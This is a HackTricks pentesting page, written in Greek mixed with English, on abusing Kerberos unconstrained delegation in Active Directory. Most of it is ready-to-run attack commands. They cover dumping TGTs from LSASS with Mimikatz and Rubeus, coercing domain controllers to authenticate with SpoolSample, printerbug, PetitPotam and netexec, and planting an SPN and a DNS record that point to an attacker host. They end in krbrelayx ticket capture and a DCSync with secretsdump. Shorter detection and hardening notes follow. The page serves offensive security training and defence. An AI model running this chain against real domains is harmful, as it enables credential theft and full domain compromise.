# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Αυτό είναι ένα feature που ένας Domain Administrator μπορεί να ορίσει σε οποιονδήποτε **Computer** μέσα στο domain. Τότε, κάθε φορά που ένας **user logins** στον Computer, ένα **copy of the TGT** αυτού του user θα **σταλεί μέσα στο TGS** που παρέχεται από το DC και θα **αποθηκευτεί στη μνήμη στο LSASS**. Άρα, αν έχεις Administrator privileges στο μηχάνημα, θα μπορείς να **dump the tickets and impersonate the users** σε οποιοδήποτε μηχάνημα.

Άρα, αν ένας domain admin logins μέσα σε ένα Computer με ενεργοποιημένο το feature "Unconstrained Delegation", και εσύ έχεις local admin privileges μέσα σε εκείνο το μηχάνημα, θα μπορείς να dump the ticket και να impersonate τον Domain Admin οπουδήποτε (domain privesc).

Μπορείς να **find Computer objects with this attribute** ελέγχοντας αν το [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute περιέχει το [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Μπορείς να το κάνεις αυτό με ένα LDAP filter του ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, το οποίο είναι αυτό που κάνει το powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Φόρτωσε το ticket του Administrator (ή του victim user) στη μνήμη με **Mimikatz** ή **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Περισσότερες πληροφορίες: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Περισσότερες πληροφορίες για το Unconstrained delegation στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Αν ένας attacker μπορέσει να **compromise έναν υπολογιστή που επιτρέπεται για "Unconstrained Delegation"**, θα μπορούσε να **παραπλανήσει** έναν **Print server** ώστε να **κάνει αυτόματα login** σε αυτόν, **αποθηκεύοντας ένα TGT** στη μνήμη του server.\
Έπειτα, ο attacker θα μπορούσε να εκτελέσει ένα **Pass the Ticket attack για να impersonate** τον χρήστη λογαριασμό του υπολογιστή του Print server.

Για να κάνεις έναν print server να κάνει login έναντι οποιουδήποτε machine μπορείς να χρησιμοποιήσεις [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Εάν το TGT είναι από domain controller, θα μπορούσες να εκτελέσεις ένα [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) και να αποκτήσεις όλα τα hashes από το DC.\
[**Περισσότερες πληροφορίες για αυτό το attack στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Βρες εδώ άλλους τρόπους να **εξαναγκάσεις authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Οποιοδήποτε άλλο coercion primitive που κάνει το victim να authenticate με **Kerberos** στον unconstrained-delegation host σου λειτουργεί επίσης. Σε σύγχρονα environments αυτό συχνά σημαίνει αντικατάσταση του κλασικού PrinterBug flow με **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, ή coercion βασισμένο σε **WebClient/WebDAV**, ανάλογα με το ποιο RPC surface είναι reachable.

### Abusing a user/service account with unconstrained delegation

Το unconstrained delegation **δεν περιορίζεται σε computer objects**. Ένα **user/service account** μπορεί επίσης να ρυθμιστεί ως `TRUSTED_FOR_DELEGATION`. Σε αυτό το scenario, η πρακτική απαίτηση είναι το account να λαμβάνει Kerberos service tickets για ένα **SPN που του ανήκει**.

Αυτό οδηγεί σε 2 πολύ συνηθισμένα offensive paths:

1. Compromise το password/hash του unconstrained-delegation **user account**, και μετά **πρόσθεσε ένα SPN** σε αυτό το ίδιο account.
2. Το account ήδη έχει ένα ή περισσότερα SPNs, αλλά ένα από αυτά δείχνει σε ένα **stale/decommissioned hostname**· η επαναδημιουργία του ελλείποντος **DNS A record** αρκεί για να hijack το authentication flow χωρίς να τροποποιήσεις το SPN set.

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Σημειώσεις:

- Αυτό είναι ιδιαίτερα χρήσιμο όταν το unconstrained principal είναι ένας **service account** και έχεις μόνο τα credentials του, όχι code execution σε joined host.
- Αν ο target user έχει ήδη ένα **stale SPN**, η αναδημιουργία του αντίστοιχου **DNS record** μπορεί να είναι λιγότερο noisy από το να γράψεις ένα νέο SPN μέσα στο AD.
- Πρόσφατο Linux-centric tradecraft χρησιμοποιεί `addspn.py`, `dnstool.py`, `krbrelayx.py`, και ένα coercion primitive· δεν χρειάζεται να αγγίξεις Windows host για να ολοκληρώσεις την αλυσίδα.

### Abusing Unconstrained Delegation with an attacker-created computer

Τα modern domains συχνά έχουν `MachineAccountQuota > 0` (default 10), επιτρέποντας σε οποιοδήποτε authenticated principal να δημιουργήσει έως N computer objects. Αν επίσης έχεις το token privilege `SeEnableDelegationPrivilege` (ή ισοδύναμα rights), μπορείς να ορίσεις το newly created computer ως trusted for unconstrained delegation και να harvest inbound TGTs από privileged systems.

High-level flow:

1) Create a computer που ελέγχεις
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Κάντε το ψεύτικο hostname να επιλύεται μέσα στο domain
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Ενεργοποιήστε το Unconstrained Delegation στον υπολογιστή που ελέγχεται από τον επιτιθέμενο
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Γιατί αυτό λειτουργεί: με unconstrained delegation, το LSA σε έναν υπολογιστή με delegation-enabled κάνει cache τα inbound TGTs. Αν ξεγελάσεις ένα DC ή privileged server να αυθεντικοποιηθεί στο fake host σου, το machine TGT του θα αποθηκευτεί και μπορεί να εξαχθεί.

4) Ξεκίνα το krbrelayx σε export mode και προετοίμασε το Kerberos material
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Εξαναγκάστε αυθεντικοποίηση από το DC/servers προς τον ψεύτικο host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx θα αποθηκεύσει αρχεία ccache όταν μια μηχανή αυθεντικοποιείται, για παράδειγμα:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Χρησιμοποιήστε το captured DC machine TGT για να πραγματοποιήσετε DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Σημειώσεις και απαιτήσεις:

- Το `MachineAccountQuota > 0` επιτρέπει τη δημιουργία υπολογιστή χωρίς δικαιώματα διαχειριστή· διαφορετικά χρειάζεσαι explicit rights.
- Η ρύθμιση του `TRUSTED_FOR_DELEGATION` σε έναν υπολογιστή απαιτεί `SeEnableDelegationPrivilege` (ή domain admin).
- Βεβαιώσου ότι υπάρχει name resolution προς το fake host σου (DNS A record) ώστε το DC να μπορεί να το προσεγγίσει με FQDN.
- Το coercion απαιτεί ένα viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, κ.λπ.). Απενεργοποίησέ τα αυτά στα DCs αν είναι δυνατόν.
- Αν το victim account είναι επισημασμένο ως **"Account is sensitive and cannot be delegated"** ή είναι μέλος του **Protected Users**, το forwarded TGT δεν θα συμπεριληφθεί στο service ticket, άρα αυτή η αλυσίδα δεν θα δώσει reusable TGT.
- Αν το **Credential Guard** είναι ενεργό στο authenticating client/server, το Windows μπλοκάρει το **Kerberos unconstrained delegation**, κάτι που μπορεί να κάνει κατά τα άλλα έγκυρα coercion paths να αποτυγχάνουν από την οπτική του operator.

Ιδέες για detection και hardening:

- Κάνε alert σε Event ID 4741 (computer account created) και 4742/4738 (computer/user account changed) όταν το UAC `TRUSTED_FOR_DELEGATION` είναι ενεργό.
- Παρακολούθησε για ασυνήθιστες DNS A-record προσθήκες στο domain zone.
- Πρόσεχε για spikes σε 4768/4769 από απρόσμενους hosts και DC-authentications προς non-DC hosts.
- Περιόρισε το `SeEnableDelegationPrivilege` σε ελάχιστο σύνολο, όρισε `MachineAccountQuota=0` όπου είναι εφικτό, και απενεργοποίησε το Print Spooler στα DCs. Εφάρμοσε LDAP signing και channel binding.

### Mitigation

- Περιόρισε τα DA/Admin logins σε συγκεκριμένες services
- Όρισε "Account is sensitive and cannot be delegated" για privileged accounts.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
